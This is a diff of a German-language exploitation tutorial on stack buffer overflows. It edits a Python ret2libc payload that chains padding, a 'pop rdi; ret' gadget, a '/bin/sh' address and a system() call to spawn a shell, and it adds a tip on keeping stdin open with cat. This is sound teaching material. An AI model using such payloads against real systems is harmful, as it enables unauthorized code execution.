@@ -531,14 +531,14 @@ exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
 bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
 
 buffer = 128 * b"a"  # 0x61
-backup_base_pointer = 8 * b"b"
+backup_base_pointer = 8 * b"b" # 0x62
 
 # gef> ropper --search 'pop rdi; red;'
 rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
 
 payload = (
-    buffer
-    + backup_base_pointer  # for padding.
+    buffer # padding.
+    + backup_base_pointer  # padding.
     + rop_pop_rdi_ret
     + bin_sh_string
     + system_call
@@ -556,6 +556,9 @@ Das generierte Payload (via Radare2):
 Und die Ausführung des Exploits:
 
 ![image](https://user-images.githubusercontent.com/173962/155951453-0620a445-15c0-46f3-908a-dc18e395ec41.png)
+
+* das `-` beim `cat` sorgt dafür, dass `stdin` nicht geschlossen wird
+(was bei einer Shell ein Problem wäre)
 
 ## BOF mit ASLR
 
